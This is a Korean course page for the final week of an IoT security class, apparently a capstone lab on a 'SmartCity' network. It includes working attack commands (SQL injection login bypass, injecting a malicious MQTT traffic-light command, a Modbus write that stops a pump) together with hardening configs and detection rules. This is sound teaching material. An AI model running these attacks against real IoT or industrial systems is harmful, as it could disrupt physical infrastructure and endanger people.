# Week 15: 종합 평가 — 전체 IoT 침투 + 보안

## 학습 목표
- 1~14주차에 학습한 전체 IoT 보안 기술을 통합 적용한다
- 복합 IoT 환경에 대한 전방위 침투 테스트를 수행한다
- 발견된 취약점에 대한 보안 대책을 구현한다
- 전문적인 IoT 보안 평가 보고서를 작성한다
- 공격자와 방어자 관점 모두를 적용한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IoT 종합 환경 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:20 | 평가 안내 및 환경 확인 (Part 1) | 강의 |
| 0:20-0:40 | 시나리오 설명 (Part 2) | 강의 |
| 0:40-0:50 | 휴식 | - |
| 0:50-1:50 | Phase A: IoT 침투 테스트 (Part 3) | 평가 |
| 1:50-2:00 | 휴식 | - |
| 2:00-2:40 | Phase B: 보안 강화 구현 (Part 4) | 평가 |
| 2:40-3:10 | Phase C: 보고서 작성 (Part 5) | 평가 |
| 3:10-3:40 | 결과 발표 및 과정 총정리 (Part 6) | 토론 |

---

## Part 1: 평가 안내 (20분)

### 1.1 종합 평가 범위

| 영역 | 관련 주차 | 평가 요소 |
|------|----------|-----------|
| 프로토콜 분석 | W02, W06, W07 | MQTT, BLE, Zigbee |
| 하드웨어/펌웨어 | W03, W04 | UART, 펌웨어 분석 |
| 웹 인터페이스 | W05, W09 | SQLi, XSS, 인증 |
| 스마트홈/허브 | W10 | 허브 공격, API |
| 허니팟/탐지 | W11 | 공격 탐지 |
| OT/SCADA | W12 | Modbus 공격/방어 |
| 자동차 | W13 | CAN 분석 |
| 보안 설계 | W14 | 인증, 암호화, OTA |

### 1.2 평가 시나리오

```
"SmartCity IoT Infrastructure" — 스마트시티 IoT 인프라

┌─────────────────────────────────────────────────────┐
│                    Cloud Platform                    │
│    ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│    │ Dashboard│  │  API GW  │  │  Data Lake   │   │
│    │ (:8088)  │  │ (:8090)  │  │              │   │
│    └────┬─────┘  └────┬─────┘  └──────────────┘   │
├─────────┼──────────────┼───────────────────────────┤
│         │    MQTT       │                           │
│    ┌────┴────┐    ┌────┴────┐                      │
│    │  MQTT   │    │  SCADA  │                      │
│    │ Broker  │    │  Server │                      │
│    │(:1883)  │    │(:5020)  │                      │
│    └────┬────┘    └────┬────┘                      │
├─────────┼──────────────┼───────────────────────────┤
│    ┌────┴────┐    ┌────┴────┐    ┌──────────┐     │
│    │ Camera  │    │  PLC    │    │  BLE     │     │
│    │ (:8554) │    │(Modbus) │    │ Sensors  │     │
│    └─────────┘    └─────────┘    └──────────┘     │
└─────────────────────────────────────────────────────┘
```

### 1.3 채점 기준

| 항목 | 배점 | 세부 |
|------|------|------|
| Phase A: 침투 테스트 | 40점 | 취약점 발견 및 활용 |
| Phase B: 보안 강화 | 30점 | 실제 보안 조치 구현 |
| Phase C: 보고서 | 30점 | 전문적 문서화 |
| **합계** | **100점** | |

---

## Part 2: 시나리오 설명 (20분)

### 2.1 대상 서비스 목록

| 서비스 | 포트 | 설명 | 프로토콜 |
|--------|------|------|----------|
| IoT Dashboard | 8088 | 관리 대시보드 | HTTP |
| Smart Hub API | 8090 | 스마트홈 허브 | HTTP/REST |
| MQTT Broker | 1883 | IoT 메시지 브로커 | MQTT |
| RTSP Camera | 8554 | IP 카메라 | RTSP |
| Modbus PLC | 5020 | 수처리 PLC | Modbus TCP |
| Camera Web | 8089 | 카메라 웹 인터페이스 | HTTP |

### 2.2 평가 태스크

**Phase A (60분): 침투 테스트**
1. 전체 서비스 정찰 및 열거
2. 각 서비스별 취약점 최소 2개 발견
3. 취약점 활용 PoC 실행
4. 후속 공격 (데이터 수집, 횡적 이동)

**Phase B (40분): 보안 강화**
1. MQTT 인증 + TLS 설정
2. 웹 인터페이스 SQLi 패치
3. Modbus 접근 제어 구현
4. 허니팟 탐지 규칙 작성

**Phase C (30분): 보고서**
1. 취약점 목록 및 위험도 평가
2. 공격 시나리오 체인 설명
3. 보안 강화 조치 문서화
4. 잔여 위험 및 추가 권고안

---

## Part 3: Phase A — IoT 침투 테스트 (60분)

### 3.1 종합 정찰

```bash
# 전체 서비스 스캔
echo "=== SmartCity IoT 종합 정찰 ==="
echo ""
echo "[1] 포트 스캔"
nmap -sV -p 1883,5020,8088,8089,8090,8554 10.20.30.80 2>/dev/null

echo ""
echo "[2] MQTT 브로커 상태"
mosquitto_sub -h 10.20.30.80 -t "\$SYS/broker/#" -v -C 5 2>/dev/null

echo ""
echo "[3] 웹 서비스 핑거프린팅"
for port in 8088 8089 8090; do
  echo "  Port $port:"
  curl -sI "http://10.20.30.80:$port" 2>/dev/null | grep -iE "(server|content-type)" | head -2
done

echo ""
echo "[4] Modbus 서비스 확인"
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('10.20.30.80', port=5020)
if c.connect():
    print('  Modbus 연결 성공 (인증 없음)')
    r = c.read_input_registers(0, 5, slave=1)
    if not r.isError():
        print(f'  Input Registers: {r.registers}')
    c.close()
" 2>/dev/null || echo "  Modbus 미연결"

echo ""
echo "[5] RTSP 카메라 확인"
echo "OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0
CSeq: 1

" | nc -w 3 10.20.30.80 8554 2>/dev/null | head -5
```

### 3.2 취약점 활용

```bash
# === MQTT 공격 ===
echo "[MQTT] 전체 토픽 구독"
timeout 10 mosquitto_sub -h 10.20.30.80 -t "#" -v 2>/dev/null &

echo "[MQTT] 악성 메시지 주입"
mosquitto_pub -h 10.20.30.80 -t "city/actuator/traffic_light" \
  -m '{"action":"all_green","intersection":"main"}' 2>/dev/null

# === 웹 대시보드 공격 ===
echo "[WEB] SQLi 인증 우회"
curl -X POST http://10.20.30.80:8088/login \
  -d "username=admin' OR '1'='1'--&password=x" -v 2>/dev/null

echo "[WEB] API 미인증 접근"
curl -s http://10.20.30.80:8090/api/config 2>/dev/null | head -10

# === Modbus 공격 ===
echo "[SCADA] Modbus 레지스터 변조"
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('10.20.30.80', port=5020)
if c.connect():
    c.write_coil(0, False, slave=1)  # 펌프 정지
    print('[!] Modbus 펌프 정지 성공')
    c.close()
" 2>/dev/null

# === 카메라 공격 ===
echo "[CAM] CGI 미인증 접근"
curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5
```

### 3.3 공격 체인 구성

```
공격 체인 시나리오:

1. MQTT 미인증 → 모든 센서 데이터 수집
2. 웹 대시보드 SQLi → 관리자 인증 정보 탈취
3. API 설정 정보 유출 → WiFi/MQTT 비밀번호 획득
4. Modbus 접근 → 수처리 시설 PLC 조작
5. 카메라 CGI → 보안 카메라 비활성화

영향: 스마트시티 인프라 전체 장악
```

---

## Part 4: Phase B — 보안 강화 구현 (40분)

### 4.1 MQTT 보안 강화

```bash
# MQTT 인증 + ACL 설정
cat << 'EOF' > /tmp/mosquitto_final.conf
listener 1883
allow_anonymous false
password_file /mosquitto/passwd

# ACL 설정
acl_file /mosquitto/acl

# 연결 제한
max_connections 100
max_inflight_messages 20
max_queued_messages 1000
EOF

cat << 'EOF' > /tmp/mosquitto_final_acl.conf
# 센서: 자기 토픽만 발행
user sensor01
topic write city/sensor/01/#

# 대시보드: 센서 데이터 읽기만
user dashboard
topic read city/sensor/#

# SCADA: 액추에이터 제어
user scada
topic readwrite city/actuator/#

# 와일드카드 구독 금지
topic deny #
EOF

echo "[+] MQTT 보안 설정 완료"
```

### 4.2 웹 인터페이스 패치

```python
# 안전한 로그인 (Parameterized Query)
"""
@app.route('/login', methods=['POST'])
def secure_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Parameterized Query (SQLi 방지)
    conn = sqlite3.connect(DB_PATH)
    user = conn.execute(
        "SELECT * FROM users WHERE username=? AND password=?",
        (username, password)
    ).fetchone()
    
    # CSRF 토큰 검증
    if not validate_csrf_token(request.form.get('csrf_token')):
        return "CSRF token invalid", 403
    
    # 로그인 시도 제한
    if is_rate_limited(request.remote_addr):
        return "Too many attempts", 429
    
    if user:
        session['username'] = user[1]
        return redirect('/dashboard')
    return render_template('login.html', error="Invalid")
"""
```

### 4.3 Modbus 접근 제어

```bash
# Modbus 방화벽 규칙 (iptables)
cat << 'EOF' > /tmp/modbus_firewall.sh
#!/bin/bash
# Modbus 접근 제어 — 허용 IP만
MODBUS_PORT=5020

# 기존 규칙 삭제
iptables -D INPUT -p tcp --dport $MODBUS_PORT -j DROP 2>/dev/null

# 허용 IP
iptables -A INPUT -p tcp --dport $MODBUS_PORT -s 10.20.30.100 -j ACCEPT  # SCADA 서버
iptables -A INPUT -p tcp --dport $MODBUS_PORT -s 10.20.30.1 -j ACCEPT    # 엔지니어링 WS

# Write 함수 코드 차단 (Deep Packet Inspection)
# Suricata 규칙으로 구현
echo 'alert modbus any any -> any $MODBUS_PORT (msg:"Modbus Write Coil"; \
  modbus: function 5; classtype:attempted-admin; sid:1000001; rev:1;)' \
  >> /tmp/modbus_suricata.rules

echo 'alert modbus any any -> any $MODBUS_PORT (msg:"Modbus Write Register"; \
  modbus: function 6; classtype:attempted-admin; sid:1000002; rev:1;)' \
  >> /tmp/modbus_suricata.rules

# 나머지 차단
iptables -A INPUT -p tcp --dport $MODBUS_PORT -j DROP
echo "[+] Modbus 방화벽 설정 완료"
EOF

chmod +x /tmp/modbus_firewall.sh
```

### 4.4 허니팟 탐지 규칙

```bash
# SIEM 탐지 규칙
cat << 'EOF' > /tmp/iot_detection_rules.yaml
# IoT 공격 탐지 규칙

rules:
  - id: IOT-001
    name: "MQTT 전체 토픽 구독 시도"
    description: "# 와일드카드로 모든 토픽 구독 시도 탐지"
    condition: "mqtt.subscribe.topic == '#'"
    severity: high
    
  - id: IOT-002
    name: "Modbus 비인가 쓰기"
    description: "허용되지 않은 IP에서 Modbus 쓰기 시도"
    condition: "modbus.function_code in [5, 6, 15, 16] AND src_ip NOT IN whitelist"
    severity: critical
    
  - id: IOT-003
    name: "IoT 기본 비밀번호 시도"
    description: "기본 비밀번호로 로그인 시도"
    condition: "auth.password in ['admin', 'root', '1234', 'password']"
    severity: high
    
  - id: IOT-004
    name: "RTSP 브루트포스"
    description: "RTSP 인증 실패 다수 발생"
    condition: "rtsp.auth_failure > 5 within 60s from same src_ip"
    severity: medium
    
  - id: IOT-005
    name: "CAN 버스 이상 트래픽"
    description: "비정상 CAN ID 또는 과도한 트래픽 탐지"
    condition: "can.frame_rate > threshold OR can.id NOT IN known_ids"
    severity: high
EOF

echo "[+] IoT 탐지 규칙 생성 완료"
```

---

## Part 5: Phase C — 보고서 작성 (30분)

### 5.1 최종 보고서 템플릿

```
# SmartCity IoT 종합 보안 평가 보고서

## 1. 경영진 요약
- 평가 대상, 기간, 범위
- 핵심 발견 사항 (Critical 취약점 수)
- 종합 위험 등급

## 2. 발견 취약점 요약

| # | 취약점 | 위험도 | 서비스 | OWASP IoT |
|---|--------|--------|--------|-----------|
| 1 | MQTT 미인증 접근 | Critical | MQTT | I1 |
| 2 | SQLi 인증 우회 | Critical | Dashboard | I3 |
| 3 | Modbus 미인증 쓰기 | Critical | SCADA | I2 |
| 4 | API 설정 정보 노출 | High | Hub API | I6 |
| 5 | RTSP 미인증 | High | Camera | I1, I9 |
| 6 | XSS (Reflected) | Medium | Dashboard | I3 |
| 7 | 경로 탐색 | Medium | Camera Web | I3 |

## 3. 공격 체인 분석
(다이어그램 + 단계별 설명)

## 4. 보안 강화 조치 (구현 완료)
- MQTT 인증 + ACL
- SQLi 패치
- Modbus 방화벽
- 탐지 규칙

## 5. 추가 권고안
(단기/중기/장기)

## 6. 부록
- 스캔 결과, PoC 상세, 로그
```

---

## Part 6: 결과 발표 및 과정 총정리 (30분)

### 6.1 과정 핵심 요약

| 주차 | 핵심 역량 |
|------|----------|
| W01-02 | IoT 아키텍처, 프로토콜 이해 |
| W03-04 | 하드웨어/펌웨어 분석 |
| W05 | 웹 인터페이스 공격/방어 |
| W06-07 | 무선 프로토콜/BLE 해킹 |
| W08 | 중간 종합 평가 |
| W09-10 | IP 카메라, 스마트홈 보안 |
| W11 | 허니팟 기반 탐지 |
| W12-13 | OT/SCADA, 자동차 보안 |
| W14 | 보안 설계 가이드라인 |
| W15 | 종합 침투 + 보안 |

### 6.2 IoT 보안 전문가 로드맵

```
입문 ──→ 중급 ──→ 고급 ──→ 전문가

입문: IoT 아키텍처, 프로토콜 기초, 기본 스캔
중급: 펌웨어 분석, 웹 공격, MQTT/BLE 해킹
고급: 하드웨어 해킹, SDR, SCADA, CAN 버스
전문가: 0-day 연구, 취약점 개발, 보안 아키텍처 설계
```

### 6.3 관련 자격증

| 자격증 | 기관 | 수준 |
|--------|------|------|
| CompTIA Security+ | CompTIA | 입문 |
| GICSP | SANS/GIAC | 중급 (ICS) |
| GRID | SANS/GIAC | 중급 (ICS) |
| OSCP | OffSec | 중급 (침투 테스트) |
| ICS-CERT | CISA | 고급 (ICS) |

---

## 참고 자료

- OWASP IoT Project: https://owasp.org/www-project-internet-of-things/
- NIST Cybersecurity for IoT: https://www.nist.gov/programs-projects/nist-cybersecurity-iot-program
- SANS ICS Resources: https://www.sans.org/ics-security/
- IoT Security Foundation: https://www.iotsecurityfoundation.org/

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (15주차) 학습 주제와 직접 연관된 *실제* incident:

### Data Theft (T1041) — 99.99% 의 dataset 패턴

> **출처**: WitFoo Precinct 6 / `complete-mission cluster` (anchor: `anc-a0364e702393`) · sanitized
> **시점**: 다중 (전체 99.99%)

**관찰**: Precinct 6 의 incident 10,442건 중 mo_name=Data Theft + lifecycle=complete-mission 이 99.99%. T1041 (Exfiltration over C2 Channel).

**MITRE ATT&CK**: **T1041 (Exfiltration over C2 Channel)**

**IoC**:
  - `다양한 src→dst (sanitized)`
  - `suspicion≥0.7`

**학습 포인트**:
- *가장 많이 일어나는 공격* 의 baseline — 모든 IR 시나리오의 출발점
- C2 채널 (HTTP/HTTPS/DNS) 에 데이터 mixed → 정상 트래픽 위장
- 탐지: outbound 에 데이터 흐름 모니터링 (bytes_out 분포), CTI feed 매칭
- 방어: DLP (Data Loss Prevention), egress filter, 데이터 분류·암호화


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
